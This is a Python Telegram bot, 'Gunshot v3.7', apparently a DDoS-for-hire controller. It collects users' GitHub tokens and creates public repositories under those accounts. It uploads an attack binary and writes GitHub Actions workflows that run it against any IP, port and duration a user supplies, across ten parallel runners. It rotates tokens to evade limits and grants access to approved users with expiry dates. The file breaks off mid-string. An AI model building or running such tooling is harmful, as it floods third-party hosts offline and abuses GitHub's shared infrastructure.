import os
import json
import logging
import time
import uuid
import asyncio
import signal
import traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler,
    filters, ConversationHandler, CallbackQueryHandler
)
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== STORAGE DIR (Railway Volume) =====
DATA_DIR = os.environ.get("DATA_DIR", "data")
os.makedirs(DATA_DIR, exist_ok=True)

def data_path(filename):
    return os.path.join(DATA_DIR, filename)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}
current_token_index = 0

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        p = data_path(filename)
        if os.path.exists(p):
            with open(p, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(data_path(filename), 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== HELPER FUNCTIONS =====
# ============================================================

def progress_bar(progress, total, length=12):
    if total <= 0:
        return "█" * length
    pct = min(1.0, progress / total)
    filled = int(pct * length)
    return "█" * filled + "░" * (length - filled)

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short", True
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted (403)", False
        return True, user.login, False
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)", True
        elif e.status == 403:
            return False, "Rate limited (403)", False
        elif e.status == 404:
            return False, "Token has no permissions (404)", True
        else:
            return False, f"GitHub error: {e.status}", True
    except Exception as e:
        return False, f"Error: {str(e)[:40]}", True

def auto_remove_expired():
    global github_tokens
    if not github_tokens:
        return 0
    removed = 0
    valid = []
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        is_valid, info, should_remove = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        elif should_remove:
            removed += 1
            logger.warning(f"🗑️ Removed invalid token: {token[:10]}... - {info}")
        else:
            td['username'] = info
            valid.append(td)
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        logger.info(f"✅ Auto-removed {removed} invalid tokens. Remaining: {len(github_tokens)}")
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK MANAGEMENT =====
def start_attack(attack_id, ip, port, time_val, user_id):
    active_attacks[attack_id] = {
        "ip": ip, "port": port, "time": time_val, "user_id": user_id,
        "start_time": time.time(), "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only admins can deploy binaries.", parse_mode='HTML')
            return ConversationHandler.END
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ <b>Token Vault Empty</b>\nAdd via <code>/addtoken</code>", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 <b>DEPLOY BINARY</b>\n\nSend <code>gunshot</code> file.\nType <code>/cancel</code> to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "gunshot":
            await update.message.reply_text(f"❌ File must be named <code>gunshot</code>. Found: <code>{file.file_name}</code>", parse_mode='HTML')
            return WAITING_FOR_BINARY
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens.", parse_mode='HTML')
            return ConversationHandler.END

        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='upload_document')
        progress = await update.message.reply_text("⏳ <b>Uploading to all repos...</b>", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("gunshot")
                    repo.update_file("gunshot", "Update gunshot binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("gunshot", "Add gunshot binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"<b>✅ BINARY DEPLOYMENT COMPLETE</b>\n"
        msg += f"📊 Success: {success_count} | Failed: {fail_count} | Total: {len(github_tokens)}\n"
        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/addtoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info, should_remove = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ <b>Invalid Token</b>\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("⚠️ Token already exists.", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(f"⚠️ @{username} already has token.", parse_mode='HTML')
                return
        repo_name = f"gunshot-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        github_tokens.append({
            'token': token, 'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat(),
            'added_by': user_id
        })
        save_json('github_tokens.json', github_tokens)
        msg = (
            f"<b>🔑 TOKEN INJECTED</b>\n"
            f"👤 @{username}\n📁 <code>{repo_name}</code>\n"
            f"📊 Vault: {len(github_tokens)}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        removed = auto_remove_expired()
        if not github_tokens:
            msg = "📭 <b>Token Vault Empty</b>"
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
            await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
            return
        msg = "<b>🔐 TOKEN VAULT</b>\n\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} invalid tokens\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username', '?')} – <code>{token_short}</code>\n   📁 <code>{t['repo']}</code>\n\n"
        msg += f"📊 Total: {len(github_tokens)}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def mytokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        my_tokens = [t for t in github_tokens if t.get('added_by') == user_id]
        if not my_tokens:
            msg = "📭 No tokens added yet."
        else:
            msg = "<b>🔑 YOUR TOKENS</b>\n\n"
            for i, t in enumerate(my_tokens, 1):
                token_short = t['token'][:10] + "…" + t['token'][-4:]
                msg += f"{i}. @{t.get('username', '?')} – <code>{token_short}</code>\n   📁 <code>{t['repo']}</code>\n\n"
            msg += f"📊 Total: {len(my_tokens)}"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def usertokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        user_tokens = {}
        for t in github_tokens:
            user_tokens.setdefault(t.get('added_by', 'Unknown'), []).append(t)
        if not user_tokens:
            msg = "📭 No tokens in vault."
        else:
            msg = "<b>📊 TOKENS PER USER</b>\n\n"
            for uid, tokens in user_tokens.items():
                msg += f"👤 <code>{uid}</code> – {len(tokens)} tokens\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            msg = "📭 No tokens to check."
        else:
            removed = auto_remove_expired()
            msg = "<b>🔍 TOKEN HEALTH</b>\n\n"
            msg += f"📊 Total: {len(github_tokens)}\n🧹 Removed: {removed}\n\n"
            for i, t in enumerate(github_tokens, 1):
                token_short = t['token'][:10] + "…" + t['token'][-4:]
                is_valid, info, _ = validate_github_token(t['token'])
                status = "✅" if is_valid else f"⚠️ {info}"
                msg += f"{i}. @{t.get('username', '?')} – <code>{token_short}</code> – {status}\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/removetoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                if is_owner(user_id) or t.get('added_by') == user_id:
                    github_tokens.pop(i)
                    save_json('github_tokens.json', github_tokens)
                    found = True
                    break
                else:
                    await update.message.reply_text("⛔ No permission.", parse_mode='HTML')
                    return
        msg = f"✅ Removed. Remaining: {len(github_tokens)}" if found else "❌ Token not found."
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            msg = "📭 Vault already empty."
        elif len(context.args) == 1 and context.args[0].lower() == "confirm":
            count = len(github_tokens)
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            msg = f"🗑️ Cleared {count} tokens."
        else:
            msg = f"⚠️ Delete ALL {len(github_tokens)} tokens? Use <code>/cleartokens confirm</code>"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== ATTACK COMMAND =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_token_index
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                "Example: <code>/attack 1.1.1.1 443 60</code>",
                parse_mode='HTML'
            )
            return
        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ Port and time must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Port 1–65535.", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 7200:
            await update.message.reply_text("❌ Time 5–7200s.", parse_mode='HTML')
            return

        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No GitHub Tokens. Add via <code>/addtoken</code>", parse_mode='HTML')
            return

        total_tokens = len(github_tokens)
        valid_token = None
        last_error = None

        for i in range(total_tokens):
            idx = (current_token_index + i) % total_tokens
            candidate = github_tokens[idx]
            try:
                logger.info(f"🔄 Trying token {idx+1}/{total_tokens}: @{candidate['username']}")
                g = Github(candidate['token'])
                repo = g.get_repo(candidate['repo'])

                try:
                    repo.get_contents("gunshot")
                except Exception:
                    last_error = f"gunshot missing in {candidate['repo']}"
                    continue

                yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x gunshot
    - run: sudo ./gunshot {ip} {port} {time_val} 200
"""
                try:
                    file = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
                except:
                    try:
                        repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
                    except:
                        repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

                current_token_index = (idx + 1) % total_tokens
                valid_token = candidate
                break

            except GithubException as e:
                last_error = e
                logger.warning(f"❌ @{candidate['username']}: {e.status}")
                if e.status in [401, 404]:
                    github_tokens.pop(idx)
                    save_json('github_tokens.json', github_tokens)
                    total_tokens = len(github_tokens)
                    if total_tokens == 0:
                        break
                    current_token_index = current_token_index % total_tokens
                elif e.status == 403:
                    continue
                else:
                    continue
            except Exception as e:
                last_error = e
                continue

        if not valid_token:
            await update.message.reply_text(f"❌ All tokens failed!\nLast error: {last_error}")
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        start_attack(attack_id, ip, port, time_val, user_id)
        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        threat = "🟢 MODERATE" if time_val <= 60 else ("🟡 HIGH" if time_val <= 300 else "🔴 CRITICAL")
        message = (
            f"<b>🔫 GUNSHOT DEPLOYED</b>\n\n"
            f"<b>Target</b>   : <code>{ip}:{port}</code>\n"
            f"<b>Duration</b> : <code>{time_val}s</code>\n"
            f"<b>Threat</b>   : {threat}\n"
            f"<b>Token</b>    : <code>@{valid_token['username']}</code>\n"
            f"<b>ID</b>       : <code>{attack_id}</code>\n\n"
            f"<i>Shot #{attack_counters.get(str(user_id), 0)} fired.</i>"
        )
        keyboard = [
            [InlineKeyboardButton("🛑 Terminate", callback_data="stop")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
        ]
        await update.message.reply_text(message, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

    except Exception as e:
        await update.message.reply_text(f"❌ Failed: <code>{str(e)[:200]}</code>", parse_mode='HTML')

# ============================================================
# ===== STATUS / START / STOP / HELP / ABOUT =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            text = "<b>📡 GUNSHOT – STANDBY</b>\n\nStatus : 🟢 IDLE\nShots  : 0\nOutput : 0 GHz"
        else:
            total_threads = len(active_attacks) * 2000
            text = f"<b>📡 ACTIVE SHOTS ({len(active_attacks)})</b>\n\n"
            idx = 1
            for aid, data in active_attacks.items():
                elapsed = int(time.time() - data['start_time'])
                bar = progress_bar(elapsed, data['time'], length=12)
                text += f"{idx}. <code>[{bar}]</code> {elapsed}s / {data['time']}s\n"
                text += f"   TARGET: <code>{data['ip']}:{data['port']}</code>\n\n"
                idx += 1
            text += f"TOTAL: {len(active_attacks)} shots | FIREPOWER: {total_threads} GHz"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            role = "👑 OWNER" if is_owner(user_id) else "✅ APPROVED"
            keyboard = [
                [InlineKeyboardButton("🚀 Launch Shot", callback_data="attack_help")],
                [InlineKeyboardButton("📡 Live Status", callback_data="status")],
                [InlineKeyboardButton("🛑 Abort All", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("⚙️ Admin Console", callback_data="admin_panel")])
            keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help_menu")])
            keyboard.append([InlineKeyboardButton("ℹ️ About", callback_data="about_menu")])

            message = (
                f"<b>🔫 GUNSHOT v3.7</b>\n\n"
                f"👤 <b>Operator</b> : @{username}\n"
                f"👑 <b>Role</b>     : {role}\n"
                f"🔄 <b>Tokens</b>   : {len(github_tokens)} Active\n"
                f"📊 <b>Status</b>   : 🟢 ONLINE\n"
                f"💥 <b>Kills</b>    : {user_attacks}\n"
                f"🌐 <b>Global</b>   : {total_attacks}\n\n"
                f"<b>⚡ Gunshot – Silence. Precision. Power.</b>"
            )
            await update.message.reply_text(message, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            f"📥 <b>Access Request</b>\n👤 @{username}\n🆔 <code>{user_id}</code>\nUse: <code>/approve {user_id} 7</code>",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "⛔ <b>Access Denied</b>\n\nRequest sent to admin. Wait for approval.",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            msg = "✅ No active shots."
        else:
            count = len(active_attacks)
            for aid in list(active_attacks.keys()):
                finish_attack(aid)
            msg = f"🛑 Terminated {count} shot(s)."
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>🔫 GUNSHOT – COMMANDS</b>\n\n"
        "<b>⚔️ STRIKE</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
        "<code>/status</code> | <code>/stop</code>\n\n"
        "<b>🔧 TOKENS</b>\n"
        "<code>/addtoken</code> | <code>/mytokens</code> | <code>/removetoken</code>\n\n"
        "<b>🔧 ADMIN</b>\n"
        "<code>/tokens</code> | <code>/usertokens</code> | <code>/checktokens</code>\n"
        "<code>/cleartokens</code> | <code>/approve</code> | <code>/remove</code>\n"
        "<code>/users</code> | <code>/pending</code> | <code>/broadcast</code>\n"
        "<code>/binary_upload</code>\n\n"
        "<b>ℹ️ UTILITY</b>\n"
        "<code>/start</code> | <code>/myid</code> | <code>/about</code>"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"<b>🆔 YOUR ID</b>\n\n<code>{update.effective_user.id}</code>"
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>🔫 GUNSHOT v3.7</b>\n\n"
        "Core     : Python 3.11 + python-telegram-bot\n"
        "Arch     : 10 Runners × 200 Threads\n"
        "Hosting  : Railway\n"
        "Rotation : Round-Robin Token Failover\n"
        "Motto    : <b>\"Silence. Precision. Power.\"</b>"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
    await update.message.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

# ============================================================
# ===== ADMIN COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📖 Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
        try:
            await context.bot.send_message(target_id, "✅ <b>Access Granted!</b>\nUse /start", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/remove &lt;user_id&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            msg = f"✅ User {target_id} removed."
        else:
            msg = "❌ User not found."
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not approved_users:
            msg = "📭 No approved users."
        else:
            msg = "<b>👥 APPROVED USERS</b>\n\n"
            for uid, data in approved_users.items():
                msg += f"<code>{uid}</code> – {data.get('days', '?')}d – 💥 {attack_counters.get(uid, 0)} shots\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not pending_users:
            msg = "📭 No pending requests."
        else:
            msg = "<b>⏳ PENDING</b>\n\n"
            for u in pending_users:
                msg += f"<code>{u.get('user_id')}</code> – @{u.get('username')}\n"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📖 Usage: <code>/broadcast &lt;msg&gt;</code>", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(f"✅ Sent to {sent} users.", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/maintenance &lt;on/off&gt;</code>", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await update.message.reply_text(f"🔧 Maintenance {'ON' if mode == 'on' else 'OFF'}.", parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACK HANDLER =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = None
    user_id = None
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        async def send_or_edit(text, reply_markup=None):
            if query.message:
                try:
                    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
                except Exception:
                    await query.message.reply_text(text, parse_mode='HTML', reply_markup=reply_markup)
            else:
                await context.bot.send_message(chat_id=user_id, text=text, parse_mode='HTML', reply_markup=reply_markup)

        if data == "attack_help":
            text = (
                "<b>🚀 LAUNCH SHOT</b>\n\n"
